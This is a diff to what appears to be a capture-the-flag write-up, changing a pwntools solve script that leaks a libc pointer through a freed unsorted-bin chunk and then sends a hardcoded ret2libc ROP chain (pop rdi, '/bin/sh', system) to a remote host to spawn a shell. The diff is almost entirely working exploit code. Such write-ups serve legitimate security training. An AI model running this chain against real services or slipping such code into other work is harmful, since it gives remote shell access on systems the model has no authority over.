@@ -268,29 +268,23 @@ from pwn import *
 import os
 
 
-context.binary = ELF("./extracted/prob", checksec=False)
+context.arch = "amd64"
 context.log_level = os.environ.get("LOG", "info")
 
 HOST = os.environ.get("HOST", "16.184.2.86")
 PORT = int(os.environ.get("PORT", "1338"))
-LIBC = ELF("./ubuntu2404-libdir/libc.so.6", checksec=False)
 CMD = os.environ.get("CMD")
 
 # The freed 0x510 chunk lands in the unsorted bin, so the stale strtok() walk
 # prints a main_arena pointer from the chunk metadata.
 MAIN_ARENA_LEAK = 0x203B20
+SYSTEM = 0x58740
+BIN_SH = 0x1CB42F
+POP_RDI = 0x10F75B
+RET = 0x2882F
 
 
 def start():
-    if args.LOCAL:
-        return process(
-            [
-                "./ubuntu2404-ld.so",
-                "--library-path",
-                "./ubuntu2404-libdir",
-                "./extracted/prob",
-            ]
-        )
     return remote(HOST, PORT)
 
 
@@ -315,16 +309,14 @@ def sep_sent(io, idx, sep):
     io.send(sep)
 
 
-def build_rop():
-    rop = ROP(LIBC)
-    chain = flat(
+def build_rop(libc_base):
+    return flat(
         b"A" * 0x28,
-        rop.rdi.address,
-        next(LIBC.search(b"/bin/sh\x00")),
-        rop.find_gadget(["ret"])[0],
-        LIBC.sym.system,
+        libc_base + POP_RDI,
+        libc_base + BIN_SH,
+        libc_base + RET,
+        libc_base + SYSTEM,
     )
-    return chain
 
 
 def main():
@@ -339,13 +331,13 @@ def main():
 
     io.recvuntil(b"Token 0: ")
     leak = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
-    LIBC.address = leak - MAIN_ARENA_LEAK
+    libc_base = leak - MAIN_ARENA_LEAK
     log.info("libc leak = %#x", leak)
-    log.info("libc base = %#x", LIBC.address)
+    log.info("libc base = %#x", libc_base)
 
     io.sendline(b"3")
     io.recvuntil(b"Any comments? ")
-    io.sendline(build_rop())
+    io.sendline(build_rop(libc_base))
 
     if CMD:
         io.sendline(CMD.encode())
@@ -365,3 +357,5 @@ Run it from the challenge directory with:
 ```bash
 python3 ./solve.py
 ```
+
+Note: this will launch a shell after exploit. Show the flag with `cat ./flag`.
